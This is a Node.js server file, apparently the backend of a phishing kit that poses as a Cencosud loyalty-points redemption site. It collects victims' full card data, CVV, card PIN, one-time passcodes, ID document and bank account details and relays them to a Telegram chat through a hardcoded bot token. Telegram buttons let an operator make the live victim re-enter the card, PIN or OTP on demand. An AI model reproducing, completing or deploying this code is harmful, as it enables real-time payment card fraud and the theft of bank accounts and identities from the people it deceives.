const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const cors = require('cors');

// Configuración
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = '8848264034:AAGjtTiD2KMIv0zcehycjbAOIv7El1VMdaw';
const TELEGRAM_CHAT_ID = '-5591163541';

// Inicializar Express y Socket.IO
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Inicializar Bot de Telegram
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Almacenar sesiones activas
const activeSessions = new Map();

// Servir archivos HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/checkout.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'checkout.html'));
});

app.get('/pin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'pin.html'));
});

app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'otp.html'));
});

app.get('/finalizar.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'finalizar.html'));
});

// Socket.IO - Manejo de conexiones
io.on('connection', (socket) => {
    console.log('Cliente conectado:', socket.id);
    
    // Guardar sesión
    activeSessions.set(socket.id, socket);
    
    socket.on('disconnect', () => {
        console.log('Cliente desconectado:', socket.id);
        activeSessions.delete(socket.id);
    });
    
    // Recibir datos de pago
    socket.on('payment-data', async (data) => {
        try {
            const sessionId = socket.id;
            
            // Crear mensaje para Telegram
            const message = `
🔔 *NUEVA REDENCIÓN DE PUNTOS - CENCOSUD*

💎 *Información de Redención:*
Puntos Cencosud: ${data.points}
Conversión: ${data.amountReceived} COP

👤 *Datos Personales:*
Teléfono: ${data.phone}
Email: ${data.email}

💳 *Información de Tarjeta:*
Número: \`${data.cardNumber}\`
Vencimiento: ${data.expiry}
CVV: ${data.cvv}
Titular: ${data.cardHolder}

📄 *Documento:*
Tipo: ${data.documentType}
Número: ${data.documentNumber}

🏦 *Información Bancaria:*
Banco: ${data.bank}
Tipo de Cuenta: ${data.accountType}
Número de Cuenta: ${data.accountNumber}

🕐 Fecha: ${new Date().toLocaleString('es-CO')}
━━━━━━━━━━━━━━━━━━━━
🔐 Session ID: \`${sessionId}\`
`;

            // Crear teclado inline con botones
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '✅ Finalizar Redención', callback_data: `finalize_${sessionId}` }
                    ],
                    [
                        { text: '🔄 Pedir Tarjeta', callback_data: `retry_card_${sessionId}` }
                    ],
                    [
                        { text: '🔐 Pedir Clave', callback_data: `request_pin_${sessionId}` }
                    ],
                    [
                        { text: '📱 Pedir OTP', callback_data: `request_otp_${sessionId}` }
                    ]
                ]
            };

            // Enviar mensaje a Telegram
            await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });

            console.log('Datos enviados a Telegram para sesión:', sessionId);
            
        } catch (error) {
            console.error('Error al enviar datos a Telegram:', error);
        }
    });
    
    // Recibir datos de PIN
    socket.on('pin-data', async (data) => {
        try {
            const sessionId = socket.id;
            
            const message = `
🔐 *CLAVE DE TARJETA RECIBIDA*

💳 *Clave:* \`${data.pin}\`

🕐 Fecha: ${new Date().toLocaleString('es-CO')}
━━━━━━━━━━━━━━━━━━━━
🔐 Session ID: \`${sessionId}\`
`;

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '✅ Finalizar Redención', callback_data: `finalize_${sessionId}` }
                    ],
                    [
                        { text: '🔄 Pedir Tarjeta', callback_data: `retry_card_${sessionId}` }
                    ],
                    [
                        { text: '🔐 Pedir Clave Nuevamente', callback_data: `request_pin_${sessionId}` }
                    ],
                    [
                        { text: '📱 Pedir OTP', callback_data: `request_otp_${sessionId}` }
                    ]
                ]
            };

            await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });

            console.log('PIN enviado a Telegram para sesión:', sessionId);
            
        } catch (error) {
            console.error('Error al enviar PIN a Telegram:', error);
        }
    });
    
    // Recibir datos de OTP
    socket.on('otp-data', async (data) => {
        try {
            const sessionId = socket.id;
            
            const message = `
📱 *CÓDIGO OTP RECIBIDO*

🔢 *OTP:* \`${data.otp}\`

🕐 Fecha: ${new Date().toLocaleString('es-CO')}
━━━━━━━━━━━━━━━━━━━━
🔐 Session ID: \`${sessionId}\`
`;

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '✅ Finalizar Redención', callback_data: `finalize_${sessionId}` }
                    ],
                    [
                        { text: '🔄 Pedir Tarjeta', callback_data: `retry_card_${sessionId}` }
                    ],
                    [
                        { text: '🔐 Pedir Clave', callback_data: `request_pin_${sessionId}` }
                    ],
                    [
                        { text: '📱 Pedir OTP Nuevamente', callback_data: `request_otp_${sessionId}` }
                    ]
                ]
            };

            await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });

            console.log('OTP enviado a Telegram para sesión:', sessionId);
            
        } catch (error) {
            console.error('Error al enviar OTP a Telegram:', error);
        }
    });
});

// Manejar callbacks de Telegram
bot.on('callback_query', async (callbackQuery) => {
    const action = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;
    
    try {
        // Extraer sessionId correctamente
        // Formato: action_sessionId (ej: finalize_abc123 o retry_card_abc123)
        const parts = action.split('_');
        let fullSessionId = '';
        
        if (action.startsWith('retry_card_') || action.startsWith('request_pin_') || action.startsWith('request_otp_')) {
            // Para acciones con dos palabras (retry_card, request_pin, request_otp)
            fullSessionId = parts.slice(2).join('_');
        } else {
            // Para acciones con una palabra (finalize)
            fullSessionId = parts.slice(1).join('_');
        }
        
        // Buscar socket activo
        const targetSocket = activeSessions.get(fullSessionId);
        
        if (!targetSocket) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '⚠️ Sesión expirada o inactiva',
                show_alert: true
            });
            return;
        }
        
        // Emitir evento según la acción
        if (action.startsWith('finalize_')) {
            targetSocket.emit('action', { type: 'finalize' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '✅ Finalizando redención...'
            });
            await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
                chat_id: callbackQuery.message.chat.id,
                message_id: messageId
            });
        }
        else if (action.startsWith('retry_card_')) {
            targetSocket.emit('action', { type: 'retry_card' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '🔄 Solicitando tarjeta nuevamente...'
            });
            await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
                chat_id: callbackQuery.message.chat.id,
                message_id: messageId
            });
        } 
        else if (action.startsWith('request_pin_')) {
            targetSocket.emit('action', { type: 'request_pin' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '🔐 Solicitando clave de tarjeta...'
            });
            await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
                chat_id: callbackQuery.message.chat.id,
                message_id: messageId
            });
        } 
        else if (action.startsWith('request_otp_')) {
            targetSocket.emit('action', { type: 'request_otp' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '📱 Solicitando código OTP...'
            });
            await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
                chat_id: callbackQuery.message.chat.id,
                message_id: messageId
            });
        }
        
    } catch (error) {
        console.error('Error al procesar callback:', error);
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Error al procesar la acción',
            show_alert: true
        });
    }
});

// Iniciar servidor
server.listen(PORT, () => {
    console.log(`🚀 Servidor ejecutándose en http://localhost:${PORT}`);
    console.log(`🤖 Bot de Telegram activo`);
});

// Manejo de errores
process.on('unhandledRejection', (error) => {
    console.error('Error no manejado:', error);
});
